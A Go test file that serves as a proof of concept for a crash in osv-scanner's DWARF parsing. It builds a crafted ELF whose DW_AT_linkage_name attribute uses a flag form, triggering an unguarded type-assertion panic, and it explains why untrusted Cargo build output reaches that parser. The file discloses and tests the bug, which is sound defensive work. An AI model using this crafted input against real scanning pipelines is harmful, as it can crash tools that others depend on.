// PoC: panic (interface conversion) in internal/sourceanalysis DWARF parsing.
//
// functionsFromDWARF iterates DWARF entries and, for every field whose
// attribute is DW_AT_linkage_name, does an unguarded type assertion:
//
//	val, err := demangle.ToString(field.Val.(string), demangle.NoClones)
//
// field.Val is an `any` whose concrete type is chosen by the DWARF *form*
// recorded in the abbreviation table. DW_AT_linkage_name is normally
// DW_FORM_string (a Go string), but nothing forces a producer to use that
// form. A malformed/crafted ELF can encode DW_AT_linkage_name with e.g.
// DW_FORM_flag (Go bool), DW_FORM_udata (Go int64) or DW_FORM_block (Go
// []byte); debug/dwarf then stores a non-string in field.Val and the
// assertion panics with "interface conversion: interface {} is bool, not
// string", crashing osv-scanner.
//
// The DWARF data here comes from files that osv-scanner itself discovers in
// an untrusted project's Cargo build output (target/release/*.rlib and the
// paths listed in target/release/*.d), so it is attacker-influenced.
//
// This test builds a minimal ELF (ET_REL) with a single .debug_abbrev /
// .debug_info compile unit whose DW_TAG_subprogram DIE has a
// DW_AT_linkage_name attribute with DW_FORM_flag, then feeds it to
// functionsFromDWARF. It should report a parse error; instead it panics.
package sourceanalysis

import (
	"bytes"
	"encoding/binary"
	"testing"
)

// uleb encodes v as DWARF ULEB128.
func uleb(v uint64) []byte {
	var out []byte
	for {
		b := byte(v & 0x7f)
		v >>= 7
		if v != 0 {
			b |= 0x80
		}
		out = append(out, b)
		if v == 0 {
			return out
		}
	}
}

func buildMaliciousElf() []byte {
	const (
		dwarfTagSubprogram   = 0x2E
		dwarfAttrLinkageName = 0x6E
		dwarfFormFlag        = 0x0C
	)

	// .debug_abbrev: one abbreviation (code 1): subprogram, no children,
	// one attribute: DW_AT_linkage_name with DW_FORM_flag.
	abbrev := []byte{}
	abbrev = append(abbrev, uleb(1)...)                    // abbrev code
	abbrev = append(abbrev, uleb(dwarfTagSubprogram)...)   // tag
	abbrev = append(abbrev, 0x00)                          // DW_CHILDREN_no
	abbrev = append(abbrev, uleb(dwarfAttrLinkageName)...) // attribute
	abbrev = append(abbrev, uleb(dwarfFormFlag)...)        // form
	abbrev = append(abbrev, 0x00, 0x00)                    // end of attribute list
	abbrev = append(abbrev, 0x00)                          // end of abbreviation table

	// .debug_info: CU header (DWARF4, 32-bit) followed by the DIE.
	die := []byte{0x01, 0x01} // abbrev code 1, then formFlag value = true
	cuBody := []byte{}
	cuBody = append(cuBody, 0x04, 0x00)             // version = 4
	cuBody = append(cuBody, 0x00, 0x00, 0x00, 0x00) // .debug_abbrev offset = 0
	cuBody = append(cuBody, 0x08)                   // address size = 8
	cuBody = append(cuBody, die...)

	info := []byte{}
	info = binary.LittleEndian.AppendUint32(info, uint32(len(cuBody)))
	info = append(info, cuBody...)

	// .shstrtab
	var shstr bytes.Buffer
	shstr.WriteByte(0)
	names := []string{".debug_abbrev", ".debug_info", ".shstrtab"}
	nameOff := map[string]uint32{}
	for _, n := range names {
		nameOff[n] = uint32(shstr.Len())
		shstr.WriteString(n)
		shstr.WriteByte(0)
	}
	shstrtab := shstr.Bytes()

	// Lay out the file contents.
	ehSize := 64
	abbrevOff := ehSize
	infoOff := abbrevOff + len(abbrev)
	shstrOff := infoOff + len(info)
	shoff := (shstrOff + len(shstrtab) + 7) &^ 7

	buf := &bytes.Buffer{}

	// ELF64 header.
	ident := make([]byte, 16)
	copy(ident, "\x7fELF")
	ident[4] = 2 // ELFCLASS64
	ident[5] = 1 // ELFDATA2LSB
	ident[6] = 1 // EV_CURRENT
	buf.Write(ident)
	le := binary.LittleEndian
	_ = binary.Write(buf, le, uint16(1))     // e_type = ET_REL
	_ = binary.Write(buf, le, uint16(62))    // e_machine = EM_X86_64
	_ = binary.Write(buf, le, uint32(1))     // e_version
	_ = binary.Write(buf, le, uint64(0))     // e_entry
	_ = binary.Write(buf, le, uint64(0))     // e_phoff
	_ = binary.Write(buf, le, uint64(shoff)) // e_shoff
	_ = binary.Write(buf, le, uint32(0))     // e_flags
	_ = binary.Write(buf, le, uint16(ehSize))
	_ = binary.Write(buf, le, uint16(0))  // e_phentsize
	_ = binary.Write(buf, le, uint16(0))  // e_phnum
	_ = binary.Write(buf, le, uint16(64)) // e_shentsize
	_ = binary.Write(buf, le, uint16(4))  // e_shnum
	_ = binary.Write(buf, le, uint16(3))  // e_shstrndx

	// Section data.
	buf.Write(abbrev)
	buf.Write(info)
	buf.Write(shstrtab)
	for buf.Len() < shoff {
		buf.WriteByte(0)
	}

	writeShdr := func(name uint32, typ uint32, off int, size int) {
		_ = binary.Write(buf, le, name)
		_ = binary.Write(buf, le, typ)
		_ = binary.Write(buf, le, uint64(0)) // flags
		_ = binary.Write(buf, le, uint64(0)) // addr
		_ = binary.Write(buf, le, uint64(off))
		_ = binary.Write(buf, le, uint64(size))
		_ = binary.Write(buf, le, uint32(0)) // link
		_ = binary.Write(buf, le, uint32(0)) // info
		_ = binary.Write(buf, le, uint64(1)) // addralign
		_ = binary.Write(buf, le, uint64(0)) // entsize
	}

	const shtProgbits = 1
	const shtStrtab = 3
	writeShdr(0, 0, 0, 0) // null section
	writeShdr(nameOff[".debug_abbrev"], shtProgbits, abbrevOff, len(abbrev))
	writeShdr(nameOff[".debug_info"], shtProgbits, infoOff, len(info))
	writeShdr(nameOff[".shstrtab"], shtStrtab, shstrOff, len(shstrtab))

	return buf.Bytes()
}

func TestPoCDwarfLinkageNameTypeConfusion(t *testing.T) {
	elfBytes := buildMaliciousElf()

	defer func() {
		if r := recover(); r != nil {
			t.Errorf("functionsFromDWARF panicked on crafted DWARF (osv-scanner would crash): %v", r)
		}
	}()

	// With the vulnerable code this line is never reached: the assertion above
	// panics first. A correct implementation returns (empty map, nil).
	functions, err := functionsFromDWARF(bytes.NewReader(elfBytes))
	if err != nil {
		t.Logf("returned a parse error (acceptable): %v", err)

		return
	}
	if len(functions) != 0 {
		t.Logf("returned %d functions: %v", len(functions), functions)
	}
}
